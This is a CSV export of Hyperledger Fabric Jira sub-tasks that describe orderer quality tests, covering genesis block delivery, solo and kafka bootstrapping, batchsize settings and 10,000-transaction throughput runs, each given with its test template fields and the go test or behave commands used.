Output: <key portions of stdout of running the test, showing it passes>",,RichardHill,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy34n:",,,,,,,,,,,,,,,,,,,,,,,RichardHill,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,,,,,,true,"09/Dec/17 8:42 AM;RichardHill;Test Name: <FAB_4777>_All orderer nodes should recieve the genesis block

Component: 
Description: verifies genesis block is recieved vy all orderers, solo and kafka
Artifact Locations: orderers.feature  , orderers_impl.py
Network Topology:  ""standard"" 
Client Driver: behave
Input: behave  --name 'FAB-4777: genesis block recieved, for kafka orderer'
Output: 
    Scenario Outline: FAB-4777: genesis block recieved, for kafka orderer -- @1.2   # orderer.feature:281
    Given I have a bootstrapped fabric network of type kafka                      # steps/basic_impl.py:140
     As a user I want to be able to verify that all orderer nodes recieve the genesis block
     context.failed = False
     1 feature passed, 0 failed, 6 skipped
     1 scenario passed, 0 failed, 106 skipped
     3 steps passed, 0 failed, 2558 skipped, 0 undefined
Took 0m29.006s
;;;","09/Dec/17 8:43 AM;RichardHill;git commit  b5296b179db03afc3107519918966ad194804a35;;;","23/Jan/18 10:13 PM;scottz;https://gerrit.hyperledger.org/r/#/c/16485/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
test steps to bootstrap orderer,FAB-4778,18083,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 3:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>
Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-666 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy34v:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
end-2-end using example02 (solo & kafka),FAB-4779,18084,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,latitiah,latitiah,16/Jun/17 3:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 12:13 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"* +Test Name+: Test example02 end to end
 * +Component+:  peer/endorser
 * +Description+: Create, join, install, instantiate, fetch, invoke and query commands against the fabric network using example02 chaincode.
 * +Artifact Locations+:  fabric/test/feature/peer.feature
 * +Network Topology+:  3 orderers, 3 zookeepers, 4 kafka brokers (both solo and kafka orderers) 2 organizations with 2 peers each
 * +Client Driver+:  behave
 * +Input+:  behave -n ""FAB-4779""
 * +Output+: 1 scenarios passed, 0 failed",,latitiah,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx1uf:",,,,,,,,,,,,,,,,,,,,,,,latitiah,qiang0723,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"boot with orderertype = solo (default), or kafka",FAB-4780,18085,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Mar/18 1:17 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"Test Name: <FAB_xxxx>_<Title>

Component: <use the Component column from the testplan>
Description: <test overview and objective> (tests the FAB-918,FAB-467 somehow)
Artifact Locations: <location of test script and input files>
Network Topology: <number of nodes of each type; use ""standard"" for our standard docker-compose file that is being used for most tests>
Client Driver: <test tool>
Input: <command to run the test>
Output: <key portions of stdout of running the test, showing it passes>",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy353:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
boot solo ntwk with non-default genesis parm:  batchsize,FAB-4781,18086,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Oct/17 5:38 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"+Test Name+:  FAB_4781_bootstrap_solo_batchsize_maxmsgcount=5

+Component+:  orderer, bootstrap

+Description+: boots up with non-default value of Batchsize MaxMessageCount: configtx.yaml CONFIGTX_ORDERER_BATCHSIZE_MAXMESSAGECOUNT and validates the specified number of transactions per block and also confirm multiple blocks can be delivered

+Artifact Locations+:  fabric/test/feature/bootstrap.feature

+Network Topology+:  1 orderer (solo), 2 organizations with 2 peers each

+Client Driver+:  behave

+Input+:   

+Output+: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy35b:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
boot kafka ntwk with non-default genesis parm: batchsize,FAB-4782,18087,16112,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,scottz,scottz,16/Jun/17 3:57 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Oct/17 5:38 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"+Test Name+:  FAB_4782_bootstrap_kafka_batchsize_maxmsgcount=5

+Component+:  orderer, bootstrap

+Description+: boots up with non-default value of Batchsize MaxMessageCount: configtx.yaml CONFIGTX_ORDERER_BATCHSIZE_MAXMESSAGECOUNT and validates the specified number of transactions per block and also confirm multiple blocks can be delivered

+Artifact Locations+:  fabric/test/feature/bootstrap.feature

+Network Topology+: ""standard"" network of 3 orderers (kafka), 4 kafka brokers, 3 zookeepers, 2 organizations with 2 peers each

+Client Driver+:  behave

+Input+:   

+Output+: ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy35j:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
stopping the leader kafka-broker while sending transactions to the orderers,FAB-4783,18093,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:47 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4783-ORD76-stopping a kafka broker
 * *Component*: Orderer
 * *Description*: send Txs stream in one thread, while another thread (or from command line 'docker stop') stops kafka-broker1 (to which Ord1 is connected).  traffic get rerouted to other KB, and does an in-flight Tx sent from Ord1 to kafka-broker1 get resent by orderer and eventually delivered (1) The test case is to restart the leader kafka broker while sending in the traffic using broadcast client and receiving through deliver client with OTE. (2) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. Then a separate thread will be used to restart the leader kafka broker
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka brokers, 3 zookeepers, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD76 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy36n:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
sending 10000 tx to 1 channel on 1 solo orderer,FAB-4784,18094,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4784-ORD77-sending tx to solo orderer on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 channel on 1 solo orderer. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=default=10. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. 
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD77 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output
 ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy36v:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to solo orderer on 1channel, batchsize=400",FAB-4785,18095,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4785-ORD78-sending tx to solo orderer on 1channel, batchsize=400
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 channel on 1 solo orderer. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=default=400. This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer solo, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD78 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output
  ",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy373:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 1 kafka broker on 1 channel, batchsize=10",FAB-4786,18096,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:48 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4786-ORD79-sending txs to 1orderer, 1kafka broker on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 orderer on 1 channel with 1 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=default=10. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 1 kafka broker, 1 zookeeper 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD79 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy37b:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 1 kafka broker on 1 channel, batchsize=400",FAB-4787,18097,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:49 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4787-ORD80-sending txs to 1orderer, 1kafka broker on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 channel on 1 orderer with 1 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=default=400. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 1 kafka broker, 1 zookeeper 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD80 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy37j:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 1 kafka broker on 1 channel, BATCHSIZE=500, PREFERREDMAXBYTES=512KB",FAB-4788,18098,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4788-ORD102-sending txs to 1orderer, 1kafka broker on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 channel on 1 orderer with 1 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. CONFIGTX_ORDERER_BATCHSIZE_MAXMESSAGECOUNT=500, CONFIGTX_ORDERER_BATCHSIZE_PREFERREDMAXBYTES=512KB. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) See block can accommodate around 490 transactions of 1kb size that uses the default PreferredMaxBytes=512K with no problems
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 1 kafka broker, 1 zookeeper 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD102 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy37r:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 1 kafka broker on 1 channel, BATCHSIZE=500, PREFERREDMAXBYTES=1024KB",FAB-4789,18099,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4789-ORD103-sending txs to 1orderer, 1kafka broker on 1channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 channel on 1 orderer with 1 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. CONFIGTX_ORDERER_BATCHSIZE_MAXMESSAGECOUNT=500, CONFIGTX_ORDERER_BATCHSIZE_PREFERREDMAXBYTES=1024KB. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers. (2) See that block can accommodate all 500 transactions of 1kb size that uses the default PreferredMaxBytes=1024K with no problems
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 1 kafka broker, 1 zookeeper 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD103 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy37z:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 4 kafka broker on 3 channel, batchsize=10",FAB-4790,18100,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4790-ORD81-sending txs to 1 orderer, 4 kafka broker on 3 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 orderer on 3 channels with 4 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=default=10. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 4 kafka broker, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD81 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy387:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 1 orderer, 4 kafka broker on 3 channel, batchsize=400",FAB-4791,18101,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4791-ORD82-sending txs to 1 orderer, 4 kafka broker on 3 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 1 orderer on 3 channels with 4 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=400. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 1 orderer, 4 kafka broker, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD82 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy38f:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 3 orderers, 4 kafka brokers on 3 channels, batchsize=10",FAB-4792,18102,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:53 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4792-ORD83-sending txs to 3 orderers, 4 kafka broker on 3 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 3 orderers on 3 channels with 4 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=10. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka broker, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD83 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy38n:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"sending 10000 tx to 3 orderers, 4 kafka brokers on 3 channels, batchsize=400",FAB-4793,18103,16114,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,scottz,scottz,16/Jun/17 4:53 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,10/Jul/18 3:23 AM,v1.0.0,,,v1.0.0,,fabric-quality,,,,,,0,orderer,quality,,,,,"* *Test Name*: FAB_4793-ORD84-sending txs to 3 orderers, 4 kafka broker on 3 channel
 * *Component*: Orderer
 * *Description*: 1 Producer per Orderer-channel send 10,000 Tx to 3 orderers on 3 channels with 4 kafka broker. Confirm all Tx delivered (wait/poll consumer as necessary), with no problems. Batchsize=400. (1) This will launch the network with the configuration mentioned below, starts the deliver clients first and each client will be connected to each orderer, starts broadcast clients for each orderer and starts sending the traffic to the orderers.
 * *Artifact Locations*: fabric/test/tools/OTE
 * *Network Topology*: 3 orderers, 4 kafka broker, 3 zookeeper, 2 orgs with 2 peers in each
 * *Client Driver*: OTE
 * *Input*: go test -run ORD84 -timeout 30m
 * *Output*: if the test ran successfully, should be able to see pass as the output",,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy38v:",,,,,,,,,,,,,,,,,,,,,,,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
